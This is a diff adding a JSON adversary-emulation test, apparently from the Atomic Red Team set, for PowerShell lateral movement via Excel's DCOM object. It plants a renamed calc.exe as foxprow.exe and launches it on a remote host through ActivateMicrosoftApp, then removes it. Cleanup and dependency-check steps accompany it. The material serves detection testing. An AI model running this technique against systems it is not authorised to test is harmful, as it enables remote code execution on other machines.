@@ -1,0 +1,111 @@
+{
+  "id": "505f24be-1c11-4694-b614-e01ae1cd2570",
+  "name": "PowerShell Lateral Movement Using Excel Application Object",
+  "description": "Powershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "eeba9091-632f-4e01-9fd0-b86688f519a1",
+      "type": "execute-command",
+      "data": {
+        "command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "618aeac9-d5db-45c8-9440-2a7a779118f1",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d8261505-d477-47dc-a975-a5a252ba11f7",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "77efd15c-5d34-49e1-981a-938f9abc469d",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1d755c8e-8e1b-4415-8d77-94589c24c621",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "eeba9091-632f-4e01-9fd0-b86688f519a1",
+      "p": "on-success",
+      "o": "618aeac9-d5db-45c8-9440-2a7a779118f1"
+    },
+    {
+      "s": "eeba9091-632f-4e01-9fd0-b86688f519a1",
+      "p": "on-failure",
+      "o": "618aeac9-d5db-45c8-9440-2a7a779118f1"
+    },
+    {
+      "s": "d8261505-d477-47dc-a975-a5a252ba11f7",
+      "p": "on-success",
+      "o": "eeba9091-632f-4e01-9fd0-b86688f519a1"
+    },
+    {
+      "s": "d8261505-d477-47dc-a975-a5a252ba11f7",
+      "p": "on-failure",
+      "o": "77efd15c-5d34-49e1-981a-938f9abc469d"
+    },
+    {
+      "s": "77efd15c-5d34-49e1-981a-938f9abc469d",
+      "p": "on-success",
+      "o": "1d755c8e-8e1b-4415-8d77-94589c24c621"
+    },
+    {
+      "s": "1d755c8e-8e1b-4415-8d77-94589c24c621",
+      "p": "on-failure",
+      "o": "eeba9091-632f-4e01-9fd0-b86688f519a1"
+    }
+  ],
+  "tags": [
+    "T1021.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "user",
+      "type": "string",
+      "description": "Name of user",
+      "value": "admin"
+    },
+    {
+      "name": "computer_name",
+      "type": "string",
+      "description": "Hostname or IP",
+      "value": "localhost"
+    }
+  ]
+}
